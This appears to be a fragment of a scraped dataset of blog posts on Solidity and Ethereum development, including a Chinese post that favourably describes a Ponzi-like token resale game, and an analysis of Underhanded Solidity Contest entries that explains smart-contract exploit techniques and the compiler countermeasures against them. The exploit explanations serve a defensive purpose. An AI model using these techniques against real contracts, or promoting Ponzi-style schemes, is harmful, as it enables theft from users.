\u54ea\u5929\u4e5f\u4f86\u767c\u5e63\u76f8\u6bd4\uff0c\u5c31\u6709\u9ede\u4ee4\u4eba\u7dca\u5f35\u4e86\u3002https://likecoin.store/\u601d\u8003\u4e86\u70ba\u4f55\u5f88\u96e3\u641c\u5c0b\u5230\u6b63\u78ba\u800c\u6709\u7528\u7684\u667a\u80fd\u5408\u7d04\u958b\u767c\u6559\u5b78\u9019\u5e7e\u5929\u627e\u4e86\u5f88\u591a\u8ddf\u667a\u80fd\u5408\u7d04\u958b\u767c\u6709\u95dc\u7684\u8cc7\u6599\uff0c\u5e7e\u5929\u524d\u624d\u8a8d\u70ba\u597d\u50cf\u627e\u4e0d\u5230\u597d\u7528\u800c\u6b63\u78ba\u7684\uff0c\u4f46\u624d\u904e\u5169\u5929\uff0c\u4e0d\u77e5\u70ba\u4f55\u7adf\u7136\u5c31\u53c8\u627e\u5230\u4e86\u5f88\u591a\u597d\u7528\u800c\u6b63\u78ba\u7684\uff0c\u6709\u5f88\u591a\u751a\u81f3\u662f\u4e00\u5169\u5e74\u524d\u7684\u820a\u6587\uff0c\u600e\u6a23\u8aaa\u90fd\u4e0d\u61c9\u8a72\u7b2c\u4e00\u6b21\u641c\u5c0b\u6c92\u641c\u5c0b\u5230\u2026\u3002\u7e3d\u4e4b\uff0c\u9019\u548c\u6211 Google \u627e\u5c0b\u5176\u4ed6\u8cc7\u6599\u6216\u77e5\u8b58\u6559\u5b78\u7684\u7d93\u9a57\u6709\u5f88\u5927\u7684\u843d\u5dee\uff0c\u5dee\u7570\u5927\u5230\u8b93\u6211\u958b\u59cb\u89ba\u5f97\u6709\u5169\u7a2e\u53ef\u80fd\uff1a\u7576\u7136\u6709\u80fd\u662f\u6211\u4e0d\u6703\u641c\uff0c\u6c92\u627e\u5c0d\u65b9\u5411\u3002\u4f46\u8aaa\u771f\u7684\uff0c\u6211\u8d85\u6703\u627e\u8cc7\u6599\uff0c\u9019\u500b\u6a5f\u7387\u5176\u5be6\u9817\u4f4e\u3002Google \u5c0d\u65bc\u300c\u5168\u65b0\u7684\u96dc\u4e82\u77e5\u8b58\u300d\u7684\u641c\u5c0b\u548c\u5efa\u6a94\u4e26\u4e0d\u5728\u884c\u3002\u56e0\u70ba\u76ee\u524d\u6709\u5728\u73a9\u667a\u80fd\u5408\u7d04\u958b\u767c\u7684\u4eba\uff08\u548c\u5176\u4ed6\u77e5\u8b58\u76f8\u6bd4\uff09\u9084\u662f\u592a\u5c11\uff0c\u6240\u4ee5\u6bcf\u7bc7\u6559\u5b78\u90fd\u6c92\u6709 \u4ec0\u9ebc \u201c\u6700\u591a\u4eba\u95b1\u8b80\u7d00\u9304\u201d \u53ef\u4f9b\u6bd4\u8f03\uff0c\u6bcf\u7bc7\u4e5f\u8a31\u95b1\u8b80\u9ede\u64ca\u7684\u4eba\u90fd\u4e0d\u591a\uff0c\u8b80\u8005\u985e\u578b\u4e5f\u5dee\u4e0d\u591a\uff0c\u9019\u9ebc\u4e00\u4f86\uff0c\u7d2f\u8a08\u7684\u8b80\u8005\u884c\u70ba\u5c0d\u65bc\u6587\u7ae0\u7684\u201c\u91cd\u8981\u5ea6\u5340\u9694\u201d\u4e5f\u5c31\u6c92\u6709\u5f37\u70c8\u7684\u52a0\u5206\u4f5c\u7528\uff0c\u9801\u9762\u548c\u9801\u9762\u4e4b\u9593\u7684\u4e92\u76f8\u9023\u7d50\u4e5f\u5c11\uff0c\u6240\u4ee5\u76f8\u5f62\u4e4b\u4e0b\u627e\u5c0b\u4e00\u500b\u8a72\u65b0\u77e5\u8b58\u7684\u7279\u5b9a\u65b9\u5411\u7684 \u201c\u7b54\u6848\u201d\u5c31\u8b8a\u5f97\u5341\u5206\u56f0\u96e3\u4e86\uff0c\u6bcf\u6b21 Google \u6311\u9078\u51fa\u4f86\u7684\u7d50\u679c\u4e5f\u5c31\u8b8a\u5f97\u98c4\u5ffd\u4e0d\u5b9a\u200a\u2014\u200a\u6c92\u6709\u77e5\u8b58\u9738\u4e3b\u3002\u4ee5\u592a\u574a Ethereum \u57fa\u91d1\u6703\u672c\u4f86\u5c31\u4e0d\u5e0c\u671b\u4eba\u4e82\u5b78\u5408\u7d04\u4e82\u767c\u5e63\u200a\u2014\u200a\u600e\u9ebc\u80fd\u8b93\u4e00\u5806\u4e2d\u4e8c\u958b\u767c\u8005\u4e82\u5b78\u4e82\u767c\u4e2d\u4e8c\u5e63\u5462\uff1f\u53c8\uff0c\u600e\u80fd\u5920\u505a\u5230\u4e0d\u8b93\u4e00\u5806\u4eba\u6563\u767c\u4e00\u5806\u4e2d\u4e8c\u5e63\u5462\uff1f\u5f88\u7c21\u55ae\uff0c\u90a3\u5c31\u662f\u4e00\u76f4\u4e0d\u65b7\u7684\u5347\u7d1a\u3001\u4fee\u6539\u667a\u80fd\u5408\u7d04\u8a9e\u8a00 Solidity \uff0c\u4e0d\u65b7\u758a\u4ee3\u3002\u57fa\u672c\u4e0a\uff0c\u5982\u679c\u4f60\u554f\u4e00\u500b Ethereum / Solidity \u4e00\u500b\u958b\u767c\u4e0a\u7684\u554f\u984c\uff0c\u591a\u534a\u4f60\u6703\u5f97\u5230\u7684\u7b54\u6848\u90fd\u662f\uff1a\u7db2\u8def\u4e0a\u7684\u8cc7\u8a0a\u90fd\u8d85\u820a\uff0c\u5f88\u591a\u932f\u3002\u9019\u4e9b\u539f\u56e0\u6216\u8a31\u90fd\u9020\u6210\u4e86 \u73a9\u5e63\u5f88\u5bb9\u6613\uff0c\u767c\u5e63\u5f88\u56f0\u96e3\uff08\u4f46\u5be6\u969b\u4e0a\u5f88\u7c21\u55ae\uff09\uff0c\u73a9\u5408\u7d04\u7684\u4eba\u66f4\u5c11 \u7684\u73fe\u8c61\uff1f\u7e3d\u7b97\u767c\u73fe\u4e00\u7bc7\u5f88\u4e0d\u932f\u7684\u667a\u80fd\u5408\u7d04\u6559\u5b78\u6587\u7ae0\u5728\u4e00\u500b\u5f88\u4e0d\u932f\u7684\u5e73\u53f0 Hashnode \u767c\u73fe\u4e86\u9019\u7bc7\u6587\u7ae0\uff1aHow to build your own Ethereum based ERC20 Token and launch an ICO in next 20\u00a0minuteshttps://hashnode.com/post/how-to-build-your-own-ethereum-based-erc20-token-and-launch-an-ico-in-next-20-minutes-cjbcpwzec01c93awtbij90uzn\u8a72\u6587\u7ae0\u4f5c\u8005\uff0c\u4e5f\u662f Hashnode \u5e73\u53f0\u7684\u5275\u8fa6\u4eba\uff0c\u6b63\u5728\u8457\u624b\u64b0\u5beb\u667a\u80fd\u5408\u7d04\u6559\u5b78\u96fb\u5b50\u66f8\u300aMastering Smart Contracts\u300b\uff0c\u4e00\u672c\u7f8e\u91d1 $9.99\uff08\u8d77\uff09\u81ea\u7531\u8a8d\u8cfc\u3002\u6211\u8cb7\u4e86\u4e00\u672c\u3002\u4e26\u767c\u73fe\u4e86\u597d\u50cf\u662f\u6b63\u898f\u7684\u667a\u80fd\u5408\u7d04\u958b\u767c\u65b9\u6cd5\uff1a Truffleframework + OpenZepplin + Ganache\u3002\uff08\uff1f\uff09\u9084\u627e\u5230\u4e86\u53ef\u80fd\u662f\u52a0\u5bc6\u8c93 CryptoKitties \u7576\u5e74\u53c3\u8003\u7684\u6559\u5b78\uff1a Ethereum Pet Shop\u200a\u2014\u200aYour First Dapp | Truffle Suite\u5b8c\u6210\u4e86 CryptoZombies DApp\u00a0\u958b\u767c\u6559\u5b78\u7b2c\u4e00\u7ae0CryptoZombies \u662f Solidity \u7dda\u4e0a\u7de8\u8f2f\u5e73\u53f0 Ethfiddle.com \u70ba\u4e86\u63a8\u5ee3\u4ee5\u592a\u574a\u53ca Solidity \u7de8\u7a0b\u77e5\u8b58\u6240\u5275\u9020\u7684\u514d\u8cbb\u5b78\u7fd2\u8ab2\u7a0b\u3002\u7adf\u7136\u6709\u4e2d\u6587\uff01https://cryptozombies.io/zh/course\u597d\u73a9\u597d\u5b78\u3002\u64da\u8aaa\u4e0a\u5b8c\u8ab2\u5c31\u53ef\u4ee5\u81ea\u5df1\u6253\u9020\u4e00\u500b\u52a0\u5bc6\u8c93\u670d\u52d9\uff01\u7b2c\u4e00\u7ae0\u4e0a\u5b8c\u5f8c\uff0c\u5275\u4e86\u5169\u96bb\u53ef\u611b\u5c0f\u6bad\u5c4d\uff0c\u4e00\u96bb\u662f\u300c\u5bf6\u535a\u58eb\u5927\u5927\u300d\u53e6\u4e00\u96bb\u53eb\u300c\u5bf6\u535a\u58eb\u592a\u592a\u300dXDCheck out my CryptoZombie \u5b9d\u535a\u58eb\u5927\u5927!\u5b78\u6703\u4e86 FB Messenger ChatBot \u9023\u7d50 Google Document Spreadsheet \u7684\u65b9\u6cd5\u76f8\u7576\u6709\u8da3\uff0c\u6559\u5b78\u5728\u6b64\uff1ahttps://medium.com/vessels/chatfuel-google-sheets-zapier-8de5c988d10b\u4ee5\u5f8c\u5c31\u53ef\u4ee5\u7528\u81c9\u66f8\u804a\u5929\u6a5f\u5668\u4eba\u8490\u96c6\u8cc7\u6599\u5566\u3002\u76ee\u524d\u6b63\u5728\u9032\u884c\u4e00\u500b\u8a08\u756b\uff0c\u8981\u8b93 FB \u6709\u85cd\u52fe\u52fe\u7684\u4eba\u5229\u7528 ChatBot \u804a\u5929\u76f4\u63a5\u9032\u884c KYC \u8eab\u5206\u8a8d\u8b49\uff0c\u6709\u9019\u500b\u65b9\u6cd5\u5c31\u7c21\u55ae\u591a\u4e86\uff01\u958b\u555f\u4e86\u4e00\u500b\u65b0\u8a08\u5283\uff1aCryptoFaces\u548c\u65b0\u8a8d\u8b58\u7684\u81fa\u5927\u5b78\u5f1f\u5171\u540c\u958b\u555f\u4e86\u9019\u500b\u8a08\u756b\u3002\u8a08\u756b\u5167\u5bb9\u5148\u4fdd\u5bc6\uff0c\u4f46\u7e3d\u4e4b\u4f60\u53ef\u4ee5\u5148\u73a9\u73a9\u770b\u9019\u500b\u6709\u8da3\u7684\u6771\u897f\uff1a https://roger-wu.github.io/crypto-roger/https://roger-wu.github.io/crypto-roger/\u7c21\u8a00\u4e4b\u5462\uff0c\u5b83\u662f\u4e00\u500b\u53ef\u4ee5\u300c\u628a\u81ea\u5df1\u4e0a\u67b6\u5230\u5340\u584a\u93c8\u4e0a\uff0c\u4f9b\u4eba\u4ea4\u6613\u300d\u7684\u670d\u52d9\u3002\u800c\u4e14\u5b83\u5957\u7528\u7684\u4ea4\u6613\u6a21\u578b\u53c3\u8003\u4e86 CryptoCountries \uff0c\u5341\u5206\u985e\u4f3c\u67d0\u7a2e\u9a19\u5c40\u4f46\u53c8\u4e0d\u662f\uff1aCryptoCountries \u4e00\u8a00\u4ee5\u853d\u4e4b\u662f\u4e00\u500b\u300c\u8cfc\u8cb7\u865b\u64ec\u570b\u5bb6\uff0c\u4e26\u671f\u5f85\u4e0b\u4e00\u500b\u4eba\u82b1\u66f4\u591a\u9322\u8cb7\u4e0b\u5b83\u300d\u7684\u904a\u6232\uff0c\u4e00\u500b\u570b\u5bb6\u7684\u50f9\u683c\u5f9e 0.001 ETH \u958b\u59cb\uff0c\u4e00\u500b\u73a9\u5bb6\u8cb7\u4e0b\u5b83\u4e4b\u5f8c\u4fbf\u80fd\u66ab\u6642\u64c1\u6709\u9019\u500b\u570b\u5bb6\uff0c\u73a9\u5bb6\u7684\u540d\u5b57\u6703\u51fa\u73fe\u5728\u90a3\u500b\u570b\u5bb6\u7684 Owner \u6b04\u4f4d\uff0c\u540c\u6642\u50f9\u683c\u6703\u4e0a\u5347100%\u8b8a\u62100.002 ETH\u3002\u5225\u7684\u73a9\u5bb6\u53ef\u4ee5\u4ed8\u9322\u7d66\u4e0a\u4e00\u500b\u64c1\u6709\u8005\u4f86\u8cb7\u4e0b\u9019\u500b\u570b\u5bb6\uff0c\u4e4b\u5f8c\u50f9\u683c\u6703\u518d\u4e0a\u5347100%\u8b8a\u62100.004 ETH\uff0c\u7b49\u5f85\u4e0b\u4e00\u500b\u73a9\u5bb6\u8cb7\u4e0b\u5b83\uff0c\u4e00\u76f4\u91cd\u8907\u4e0b\u53bb\u3002\u904e\u7a0b\u4e2d\u6bcf\u4e00\u500b\u8cfc\u8cb7\u8005\u90fd\u80fd\u7372\u5f97100%\u7684\u6536\u76ca\uff0c\u800c\u5012\u9709\u7684\u6700\u5f8c\u4e00\u96bb\u8001\u9f20\u5247\u6703\u627f\u53d7\u9245\u984d\u7684\u8667\u640d\u3002\u2014 Roger Wu \u5340\u584a\u93c8\u904a\u6232\u7684\u65b0\u71b1\u6f6e\uff1a\u985e\u9f90\u6c0f\u9a19\u5c40\u904a\u6232\u96d6\u7136\u6709\u9ede\u602a\uff0c\u4f46\u662f\u9817\u597d\u73a9\u3002\u81ea\u5f9e\u5bf6\u535a\u58eb\u6295\u8cc7\u4e86 Roger 0.001 \u4ee5\u592a\u5e63\u4e4b\u5f8c\uff0c\u4ed6\u53ef\u662f\u6f32\u4e86\u597d\u5e7e\u500d\u5462\uff08\u7b11\uff09\u3002\u7e3d\u4e4b\uff0cCryptoFaces \u5e74\u5f8c\u958b\u5de5\uff01\u5e0c\u671b\u5f88\u5feb\u80fd\u8ddf\u5927\u5bb6\u5206\u4eab\u5566\uff01\u5e0c\u671b\u5927\u5bb6\u80fd\u5f9e\u5bf6\u535a\u58eb\u7684\u6587\u7ae0\u88e1\uff0c\u770b\u898b\u4e00\u4e9b\u4f60\u672c\u4f86\u4e5f\u60f3\u770b\uff0c\u6216\u8005\u672c\u4f86\u4e0d\u77e5\u9053\u537b\u60f3\u77e5\u9053\u7684\u6d88\u606f\u3002\u795d\u5927\u5bb6\u65b0\u5e74\u5feb\u6a02\uff01\u72d7\u5e74\u65fa\u798f\uff01\ud83d\udc36", "responses": "3"}, {"title": "Working with Strings in\u00a0Solidity", "author_name": "Aventus Network", "link": "https://blog.aventus.io/working-with-strings-in-solidity-473bcc59dc04?source=search_post", "post_date": "Jul 6, 2018", "readtime": "9 min read", "upvotes": "710", "content": "Working with Strings in\u00a0SolidityAventus NetworkBlockedUnblockFollowFollowingJul 6, 2018This is the first in a series of blogs we\u2019re going to bring to you directly from the trenches, going into some of the nitty-gritty technical detail of some of the things we\u2019re doing with the Protocol at the moment.Today\u2019s article comes from Alex Pinto, a recent addition to our blockchain engineering team who\u2019s been spending the past few weeks getting up to speed on using Solidity, and will take us through some of the challenges and particularities of the language.", "responses": "2"}, {"title": "How Solidity Events Are Implemented\u200a\u2014\u200aDiving Into The Ethereum VM Part\u00a06", "author_name": "Howard", "link": "https://blog.qtum.org/how-solidity-events-are-implemented-diving-into-the-ethereum-vm-part-6-30e07b3037b9?source=search_post", "post_date": "Jan 21, 2018", "readtime": "13 min read", "upvotes": "890", "content": "How Solidity Events Are Implemented\u200a\u2014\u200aDiving Into The Ethereum VM Part\u00a06HowardBlockedUnblockFollowFollowingJan 21, 2018You\u2019ll need a bloom filter to find the hat you\u00a0wantIn How To Decipher A Smart Contract Method Call we\u2019ve learned how \u201cmethod\u201d is an abstraction built on top of simpler EVM primitives like \u201cjump\u201d and \u201ccomparison\u201d instructions.In this article, we will take a deep dive into Solidity Events. In the wild, there are three main uses for event logs:As ersatz return values, because a transaction does not record a method\u2019s return values.As a kind of cheaper alternative data storage, as long as the contract does not need access to it.Finally, as events that DApp clients can subscribe to.Event logging is a relatively complex language feature. But like methods, they map to much simpler EVM logging primitives.By understanding how events are implemented with lower level EVM instructions, and how much they cost, we\u2019ll gain a better intuition for using events effectively.", "responses": "6"}, {"title": "Writing robust smart contracts in\u00a0Solidity", "author_name": "Elena Dimitrova", "link": "https://medium.com/colony/writing-more-robust-smart-contracts-99ad0a11e948?source=search_post", "post_date": "Aug 10, 2016", "readtime": "4 min read", "upvotes": "262", "content": "Writing robust smart contracts in\u00a0SolidityElena DimitrovaBlockedUnblockFollowFollowingAug 10, 2016Before contract function code executes, it\u2019s a good idea to validate who triggered it and what inputs are given.Here we build on the Solidity documentation and our own practice to demonstrate a few methods for validating caller and data of inter-contract communication, in both contract-to-contract and user-to-contract calls.Restricting access is a common pattern for contracts. Note that you can never restrict any human or computer from reading the content of your transactions or your contract\u2019s state. [..] You can restrict read access to your contract\u2019s state by other contracts.Furthermore, you can restrict who can make modifications to your contract\u2019s state or call your contract\u2019s functions. The use of function modifiers makes these restrictions highly readable.Building on the Solidity common patterns above, we make extensive use of function modifiers to ensure the validity of function calls in terms of who the caller is as well as what data is.Validating callerFor call authorisation we can start with a simple scenario where the creator of the contract is the only one we\u2019d like to allow to make certain restricted \u2018owner-only\u2019 calls, e.g. changing the owner, writing to storage, or killing the contract.The Ownable.sol contract below defines the basis of implementing such contract \u2018ownership\u2019 and owner-only function modifier.Any contract which inherits Ownable will have owner set to the caller at the time of its creation, and any of its functions implementing onlyOwner modifier will not accept calls from another account. Note that the creator can be a user or another contract.To put that in context, we use the sample contract code from our previous post on implementing upgradable contracts\u200a\u2014\u200aspecifically the main two contracts: \u2018Parent\u2019 and \u2018Organisation\u2019. To recap those, Parent contract is used to create, store, retrieve and upgrade Organisation instances. Organisation interacts with an instance of EternalStorage via ProposalsLibrary and also with an ITokenLedger implementation instance.We\u2019ll demonstrate how to secure Organisation contract\u2019s storage to allow owner-only write permissions.Securely writing to\u00a0StorageEternalStorage contract is used to read and write values of different types to storage. Every Organisation contract has an instance of EternalStorage to which only it should be able to write. In this case the owner of EternalStorage should be a contract (Organisation) rather than a user. We do not want users to be interacting directly with storage as all the business rules for data are abstracted away from it.For the implementation we simply inherit Ownable and decorate all storage write functions with the onlyOwner modifier, e.g. setUIntValue, setStringValue etc.We need to ensure the owner of EternalStorage instance is the Organisation contract. The easiest way to ensure that, is to let it create it. See constructor below.Here msg.sender in EternalStorage is the Organisation contract which then becomes the only address allowed to write to storage.Note on Libraries: We use a library contract (ProposalsLibrary) to attach a set of functions to EternalStorage, so effectively message calls flow through the following chain: Organisation -> ProposalsLibrary -> EternalStorage.However, since libraries in Solidity pass on the msg.value and msg.sender values, calls to EternalStorage have msg.sender as the Organisation contract address and not ProposalsLibrary address.Securely writing to Storage\u200a\u2014\u200aextended\u00a0exampleLet\u2019s extend the simplified example above to cover our sample scenario of using a Parent contract to create and manage Organisations. We would also like to remove the Organisation contract dependency on EternalStorage just to make our contract lighter. For this we have delegated the role of creating EternalStorage and Organisation to Parent contract, which are both created via the Parent.createOrganisation(bytes32) function. When Parent calls new EternalStorage() it becomes the owner of it as well, so it needs to call Ownable.changeOwner(address) to adjust ownership to the newly created Organisation.This is an example of where EternalStorage ownership change is required due to the more complex initiation process of our contracts.Support for multiple admin\u00a0accountsSince msg.sender only allows for a single owner per contract, to implement support for multiple admins we can make use of storage to manage a collection of user admin account addresses.Below is a helper library which implements the basic functionality of adding and removing admin accounts for a given contract (address).The isUserAdmin function can then be used in a modifier, just like onlyOwner in our previous example. For instance if we wanted to allow multiple admins in Organisation we can implement this as follows.Validating dataIn addition to authorising the call sender, modifiers can be also used to validate the data provided with the call. A sample library of useful modifiers is below, implementing checks for various types, e.g. empty address or zero value integers.Putting it all\u00a0togetherWith the armour of authorisation and validation modifiers you can decorate your functions as necessary to ensure that before you execute a function, you have subjected the caller and call data to the utmost scrutiny.\u00a0Example of such use is in our Organisation.addProposal(bytes32) function which should only allow Organisation admins to create proposals. Additionally we ensure no ether is sent with the request and that we get a non empty key for the proposal being created.", "responses": "1"}, {"title": "A security issue with Ethereum\u2019s Solidity language, not just the\u00a0DAO", "author_name": "Muneeb Ali", "link": "https://medium.com/@muneeb/solar-storm-a-serious-security-exploit-with-ethereum-not-just-the-dao-a03d797d98fa?source=search_post", "post_date": "Jun 20, 2016", "readtime": "3 min read", "upvotes": "134", "content": "A security issue with Ethereum\u2019s Solidity language, not just the\u00a0DAOMuneeb AliBlockedUnblockFollowFollowingJun 20, 2016UPDATE: This post is from June 2016 and listed a security issue with Solidity. Since then there have been other issues but also a lot of growth of the Ethereum ecosystem. It\u2019s great to see innovation in decentralized computing.", "responses": "9"}, {"title": "Public vs External Functions in\u00a0Solidity", "author_name": "Gustavo (Gus) Guimaraes", "link": "https://medium.com/@gus_tavo_guim/public-vs-external-functions-in-solidity-b46bcf0ba3ac?source=search_post", "post_date": "Jul 29, 2017", "readtime": "", "upvotes": "424", "content": "Public vs External Functions in\u00a0SolidityGustavo (Gus) GuimaraesBlockedUnblockFollowFollowingJul 29, 2017I have been going through functions in smart contracts code I am creating and decided to make it more explicit s per this best practice\u00a0.I noticed that I hesitated whenever I was about to add either the public or external visibility mark. This came from a place of uncertainty as to which is better to use when exposing the smart contract functions to outside calls. I came across this excellent answer on StackOverflow.In a nutshell, public and external differs in terms of gas usage. The former use more than the latter when used with large arrays of data. This is due to the fact that Solidity copies arguments to memory on a public function while external read from calldata which a cheaper than memory allocation. I went on to the yellow paper to refresh my memory about call data opcodes.public functions are called internally and externally. internal calls are executed via jumps in the code because array arguments are passed internally by pointers to memory. When the compiler generates the code for an internal function, that function expects its arguments to be located in memory. That is why public functions are allocated to memory. The optimization that happens with external is that is does not care for the internal calls.So if you know the function you create only allows for external calls, go for it. It provides performance benefits and you will save on gas.", "responses": ""}, {"title": "Advanced Solidity code deployment techniques", "author_name": "Jorge Izquierdo", "link": "https://medium.com/aragondec/advanced-solidity-code-deployment-techniques-dc032665f434?source=search_post", "post_date": "Mar 15, 2017", "readtime": "6 min read", "upvotes": "363", "content": "Advanced Solidity code deployment techniquesJorge IzquierdoBlockedUnblockFollowFollowingMar 15, 2017This is a continuation post to the work we did with Zeppelin for the article on Proxy libraries for code upgradeability. Reading that post is not required in order to understand this one, but it is definitely a recommended read, as the ideas are pretty much on the same line. And towards the end we will combine them.This post is a collection of small ideas that were each of them too small to be a separate post but were also out of the scope of the previous post.Some credits are due to Martin Holst Swende whose posts he wrote around September 2015 I have been encountering all the time while working on this. Especially this post on Ethereum quirks and vulns.An important disclaimer is that these practices can be risky if they are not used with maximum care and attention and their implementation is a prototype and hasn\u2019t been audited. Please don\u2019t copy and paste any of the code below without fully understanding it. They bring a lot of dynamism, but this dynamism comes at a price, in this case security.The three techniques are:Dynamic contract factories.Counterfactual contract deployment.Arbitrary code execution on deployed contracts.After that I will try to make the case for how combining these three ideas on top of dynamically linked libraries, can make for a great future-proof system.Dynamic contract factoriesLet\u2019s state this clear, \u2018traditional\u2019 contract factories are a pain in the ass. The moment you do new Contract(...) anywhere in your Solidity code, that contract\u2019s bytecode will automatically be appended at the end of the main contract bytecode. The problem with this is that factories get pretty fast very expensive in gas terms, as you will be paying for deploying the factory and all its childs in the same transaction, which can make it go over the gas limit.The other downside of this, is that this bytecode is not modifiable in any way by the contract. There is another way of deploying contracts from Solidity without needing to do new and that is by calling the create opcode directly and providing it with a dynamic byte array.In order to deploy a contract this way, you would call the deployCode function with the bytecode of the contract to deploy as argument (the input data of a contract deploy transaction).A live example of this in the Kovan testnet can be found here.With this working, you can think of more involved mechanisms to get the byte array there. It is trivial to create \u2018code registries\u2019 that are basically dynamic factories. In this example anyone can deploy code under a identifier, and only this address can update the code when she wants.And here you can see the two example transactions in Kovan: first the uploading of the code and here the deployment of the code with its identifier.Counterfactual contract deploymentUPDATE: Most of this will be invalid after EIP 86 (scheduled for Metropolis)Now that we have the ability for a contract to deploy code that could have been unknown when it was deployed, an interesting point is knowing what the addresses of these contracts will be before hand.The fact that we can deterministically know what address a not-yet-deployed contract will have can allow for prefunding a contract before its existance or hardcoding its address even though it has not been developed yet.In Ethereum contracts are always deployed in an address that is a funcion of that account\u2019s address and its nonce:contractAddress = sha3(rlp_encode([address, nonce]))[14:]Basically, the last 20 bytes of the sha3 of the list composed by the adderess and the nonce RLP encoded.For a private-key based account, the nonce has to be incremented every time a transaction is sent from that account. In the case of the contract, it is only incremented when it does a create operation, that it is, every time the contract creates another contract. The Solidity function for determining all the contract addresses that contract will deploy could be something like this:Note: this function will only apply for the first 127 contracts created by the contract. In order to really scale this method, a proper RLP encode implementation would be needed.For example, from nonce 128 to 257 it would be:address(sha3(0xd7, 0x94, address(this), 0x81, nonce))On deployment it will send whatever value it was deployed with to the address its first contract will be deployed at. We can see that Etherscan labels it as an address first. The moment we execute deployCode it is converted into a contract and this contract can managed its previously allocated funds.You can see the example deployed to Kovan here.Arbitrary code execution on deployed contractsA bit unrelated from this two last ideas is allowing for arbitrary code execution on already deployed contracts.Using a similar flow as with proxy libraries, if we perform a delegatecall from the contract to an arbitrary one, this one will be able to change the contract storage.We will start defining a Fixeable base class that contracts that want to be fixed need to inherit from:Contracts define under what circumstances they will be able to execute code, here you can imagine all the complexity and governance you are comfortable with, but let\u2019s keep it simple for this example:And now for the Fixer contract, which inherits from BrokenContract so they have the same storage and it can easily modify it:With everything in place, I wrote a simple test in Javascript to demonstrate the expected behavior:This is the transaction on Kovan that executes the code and fixes the contract.Putting it all\u00a0togetherLet\u2019s combine the tricks exposed above plus proxy libraries together in a real hypothetic (or not) case.Imagine you had a pretty bad bug in your token code, that could cause all balances to be wiped out. You could update the logic for the function that was broken by deploying a new library and then linking your contract to this new logic in the Dispatcher.All the balances are wiped out because of this attack, but thanks to the arbitrary code execution feature you could code a contract (or set of contracts) that will reset the balances to their values before the attack.We have now fixed the bug and reset it to the proper balances without changing the main contract.ConclusionThese three techniques, plus the idea of proxy libraries\u200a\u2014\u200awhere all bug prone and business logic lives\u200a\u2014\u200acan make for a pretty dynamic environment for deploying future safe smart contracts.We need to assume there will be dumb entities (exchanges or IoT devices for example) that will have the address of a given contract hardcoded and changing it might be too burdensome. While ENS could help with this, there will be entities that will keep relying on non upgradeable addresses.This dynamism is very important for Aragon, where we intend to deploy contracts that could be there for decades.", "responses": "3"}, {"title": "Lessons Learnt from the Underhanded Solidity\u00a0Contest", "author_name": "Christian", "link": "https://medium.com/@chriseth/lessons-learnt-from-the-underhanded-solidity-contest-8388960e09b1?source=search_post", "post_date": "Sep 22, 2017", "readtime": "5 min read", "upvotes": "562", "content": "Lessons Learnt from the Underhanded Solidity\u00a0ContestChristianBlockedUnblockFollowFollowingSep 22, 2017Underhanded coding contests are a good way to highlight shortcomings of a programming language. Solidity has a big advantage here over languages like C, because it can still be changed to some degree without breaking too many tools and programs. Because of that, in reaction to the Underhanded Solidity Contest (results) I would like to provide an analysis of some of the submissions and explain how we changed the language (or plan to change it) or at least explain which compiler warnings we introduced.ShadowingMany of the submission exploited the fact that it was possible to shadow built-ins like now or msg. We already added warnings in such situations shortly before the beginning of the contest. The solution is not yet complete, because there are still some ways to confuse users by shadowing/overloading using inheritance, but we are also working on that.Bypassing Ether AccountingAnother very common theme was to use the fact that it is possible to send Ether to a contract without triggering the fallback function, and thus bypassing any internal accounting that might be done there.Three example submissions that exploit this are the one by Jo\u00e3o Carvalho (won third prize), Richard Moore (won second prize) and Christoph Jentzsch (a very short example). This is a quite tricky problem to tackle by means of the language, because sending Ether without executing the receiving contract cannot be prevented without serious changes to the Ethereum protocol. We could introduce a \u201cmagic storage variable\u201d that automatically tracks Ether sent via regular means, but that would be quite expensive and because of that would also make it impossible for a contract to receive Ether within the fallback function gas stipend. Another measure would be to warn about this issue whenever this.balance is used outside of the context of a mere x.transfer(this.balance)\u00a0, but it would probably have a quite high false positive rate. This problem has been part of the Security Considerations section of the Solidity documentation for a long time, and at the moment, this is the best \u201csolution\u201d we could come up with.Gigantic ArraysA different problem is exploited in the submission by Doug (honorable mention). It allows overwriting objects in storage by generating a gigantic array.The following two problems lead to the attack:The length member of storage arrays can be assigned arbitrarily.Gigantic storage arrays (as opposed to mappings) overlap predictively.Since changing the storage layout would be a quite drastic change which would probably also make it necessary to add version information to libraries, it is better to fix point 1.With the introduction of the SMT-based overflow checker, the underflow used in the exploit would be noticed at compile-time and it would be required to change the code fromtoto silence the warning and thus also make the exploit impossible.The introduction of a pop method, as suggested in the code, would of course also help.This still does not solve situations where you use something like x.length = 2**200 directly. While Solidity currently warns you about such large arrays if they are static, it does not do so for dynamic arrays. Here, the SMT solver might come to a rescue and require that such assignments to length are either \u201csmall\u201d or they are done using x.length += a or x.length -= a for a \u201csmall\u201d a\u00a0.Overflows in the ABI\u00a0DecoderThe winning entry by Martin Swende exploited an overflow in the ABI decoder. The attacker would craft a special transaction payload such that the length property of an array is gigantic while the data used is comparatively small. The second fact is required because the transaction would require too much gas otherwise. This is made possible because the ABI decoder routine that computes the number of bytes from the array length (size_in_bytes = number_of_elements * 32) overflows. Still, it is quite hard to exploit this and the smart contract does it by using the explicit length member in one part of the code and another length that was computed manually from the size of the calldata in another part of the code. The resulting code looks a little weird as expected.Since the bug is hard to exploit and we are working on a re-implementation of the ABI encoder and decoder in the new intermediate language iulia anyway, we decided to only put safety measures into the new decoder. Apart from avoiding such overflows, the new decoder also checks that it never reads beyond the supplied data length (which is actually fine because it is specified to be filled with zeros, but indicates an invalid input encoding).MiscellaneousThe submission by glockenspieleth relies on type deduction rules which might be counter-intuitive at first, especially in the well-known snippet for (var i = 0; i < x.length; x++)\u00a0, but this case has been warned about in the compiler for quite some time now.A submission by andrejcvoro exploited another bug in a for loop:for (uint i = 4; i >= 0; i--) {\u00a0... }This loop will not terminate because i >= 0 is always true. Such cases will be detected by the SMT solver in the future.The contract by blockie exploits the unary plus infamous due to a bug in the hacker gold token contract. The compiler warns about this for quite some time and it will be fully removed in the next breaking release.Marco Giglio exploits homoglyphs (different characters that look similar or identical) in string literals. We currently do not plan any countermeasure against this since there is very little use for string literals in Solidity (as opposed to e.g. JavaScript). The fact that the contract uses string literals and not type-safe structs is hopefully suspicious enough. If you think otherwise, please get in touch.Uninitialized storage pointers are exploited by sammayo, which leads to unintended overwrites in storage. The compiler has a warning for the usual cases for a long time, and we are working to catch the remaining special cases. It now also requires an explicit storage keyword for storage pointers.The submission by Zachary Williamson 